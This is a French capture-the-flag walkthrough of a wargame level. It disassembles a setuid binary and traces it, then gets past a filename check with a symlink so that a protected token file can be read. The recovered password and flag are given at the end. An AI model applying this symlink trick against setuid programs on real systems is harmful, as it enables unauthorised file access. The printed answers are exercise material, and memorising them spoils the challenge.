# LEVEL 08

- On commence par regarder ce qu'on a avec `ls -l` \
Resultats:
```
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```
- On essaye de regarder ce qu'il y a dans token: `cat token` \
```
cat: token: Permission denied
```

- On essaye de lancer le binaire `./level08 `: \
```
./level08 [file to read]
```

- `./level08 token`: \
```
You may not access 'token'
```

- On essaye de voir ce que ce binaire fait: `objdump -D level08` \
result:
```
08048554 <main>:
 8048554:	55                   	push   %ebp
 8048555:	89 e5                	mov    %esp,%ebp
 8048557:	83 e4 f0             	and    $0xfffffff0,%esp
 804855a:	81 ec 30 04 00 00    	sub    $0x430,%esp
 8048560:	8b 45 0c             	mov    0xc(%ebp),%eax
 8048563:	89 44 24 1c          	mov    %eax,0x1c(%esp)
 8048567:	8b 45 10             	mov    0x10(%ebp),%eax
 804856a:	89 44 24 18          	mov    %eax,0x18(%esp)
 804856e:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax
 8048574:	89 84 24 2c 04 00 00 	mov    %eax,0x42c(%esp)
 804857b:	31 c0                	xor    %eax,%eax
 804857d:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
 8048581:	75 23                	jne    80485a6 <main+0x52>
 8048583:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 8048587:	8b 10                	mov    (%eax),%edx
 8048589:	b8 80 87 04 08       	mov    $0x8048780,%eax
 804858e:	89 54 24 04          	mov    %edx,0x4(%esp)
 8048592:	89 04 24             	mov    %eax,(%esp)
 8048595:	e8 86 fe ff ff       	call   8048420 <printf@plt>
 804859a:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 80485a1:	e8 ba fe ff ff       	call   8048460 <exit@plt>
 80485a6:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 80485aa:	83 c0 04             	add    $0x4,%eax
 80485ad:	8b 00                	mov    (%eax),%eax
 80485af:	c7 44 24 04 93 87 04 	movl   $0x8048793,0x4(%esp)
 80485b6:	08
 80485b7:	89 04 24             	mov    %eax,(%esp)
 80485ba:	e8 41 fe ff ff       	call   8048400 <strstr@plt>
 80485bf:	85 c0                	test   %eax,%eax
 80485c1:	74 26                	je     80485e9 <main+0x95>
 80485c3:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 80485c7:	83 c0 04             	add    $0x4,%eax
 80485ca:	8b 10                	mov    (%eax),%edx
 80485cc:	b8 99 87 04 08       	mov    $0x8048799,%eax
 80485d1:	89 54 24 04          	mov    %edx,0x4(%esp)
 80485d5:	89 04 24             	mov    %eax,(%esp)
 80485d8:	e8 43 fe ff ff       	call   8048420 <printf@plt>
 80485dd:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 80485e4:	e8 77 fe ff ff       	call   8048460 <exit@plt>
 80485e9:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 80485ed:	83 c0 04             	add    $0x4,%eax
 80485f0:	8b 00                	mov    (%eax),%eax
 80485f2:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
 80485f9:	00
 80485fa:	89 04 24             	mov    %eax,(%esp)
 80485fd:	e8 6e fe ff ff       	call   8048470 <open@plt>
 8048602:	89 44 24 24          	mov    %eax,0x24(%esp)
 8048606:	83 7c 24 24 ff       	cmpl   $0xffffffff,0x24(%esp)
 804860b:	75 21                	jne    804862e <main+0xda>
 804860d:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 8048611:	83 c0 04             	add    $0x4,%eax
 8048614:	8b 00                	mov    (%eax),%eax
 8048616:	89 44 24 08          	mov    %eax,0x8(%esp)
 804861a:	c7 44 24 04 b2 87 04 	movl   $0x80487b2,0x4(%esp)
 8048621:	08
 8048622:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048629:	e8 12 fe ff ff       	call   8048440 <err@plt>
 804862e:	c7 44 24 08 00 04 00 	movl   $0x400,0x8(%esp)
 8048635:	00
 8048636:	8d 44 24 2c          	lea    0x2c(%esp),%eax
 804863a:	89 44 24 04          	mov    %eax,0x4(%esp)
 804863e:	8b 44 24 24          	mov    0x24(%esp),%eax
 8048642:	89 04 24             	mov    %eax,(%esp)
 8048645:	e8 c6 fd ff ff       	call   8048410 <read@plt>
 804864a:	89 44 24 28          	mov    %eax,0x28(%esp)
 804864e:	83 7c 24 28 ff       	cmpl   $0xffffffff,0x28(%esp)
 8048653:	75 1c                	jne    8048671 <main+0x11d>
 8048655:	8b 44 24 24          	mov    0x24(%esp),%eax
 8048659:	89 44 24 08          	mov    %eax,0x8(%esp)
 804865d:	c7 44 24 04 c4 87 04 	movl   $0x80487c4,0x4(%esp)
 8048664:	08
 8048665:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 804866c:	e8 cf fd ff ff       	call   8048440 <err@plt>
 8048671:	8b 44 24 28          	mov    0x28(%esp),%eax
 8048675:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048679:	8d 44 24 2c          	lea    0x2c(%esp),%eax
 804867d:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048681:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048688:	e8 03 fe ff ff       	call   8048490 <write@plt>
 804868d:	8b 94 24 2c 04 00 00 	mov    0x42c(%esp),%edx
 8048694:	65 33 15 14 00 00 00 	xor    %gs:0x14,%edx
 804869b:	74 05                	je     80486a2 <main+0x14e>
 804869d:	e8 8e fd ff ff       	call   8048430 <__stack_chk_fail@plt>
 80486a2:	c9                   	leave
 80486a3:	c3                   	ret
 80486a4:	90                   	nop
 80486a5:	90                   	nop
 80486a6:	90                   	nop
 80486a7:	90                   	nop
 80486a8:	90                   	nop
 80486a9:	90                   	nop
 80486aa:	90                   	nop
 80486ab:	90                   	nop
 80486ac:	90                   	nop
 80486ad:	90                   	nop
 80486ae:	90                   	nop
 80486af:	90                   	nop
```
On voit qu'il y a des appels a printf, et cela se confirme avec:
- `ltrace ./level08 token` : \
result:
```
__libc_start_main(0x8048554, 2, 0xbffff6e4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                  = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)              = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```
On voit qu'on essaye de printer un token mais qu'on n'a pas les droits, on decide de creer un fichier pour lequel nous avons les droits, rajouter un lien symbolique dessus qui pointe sur token, pour bypass le probleme d'acces et afficher le token:

```
ln -s /home/user/level08/token /var/crash/yooo
./level08 /var/crash/yooo
```
result:
`quif5eloekouj29ke0vouxean`

## 🔥 Password
`quif5eloekouj29ke0vouxean`

## ⚡ Flag
`25749xKZ8L7DkSCwJkT9dyv6f`
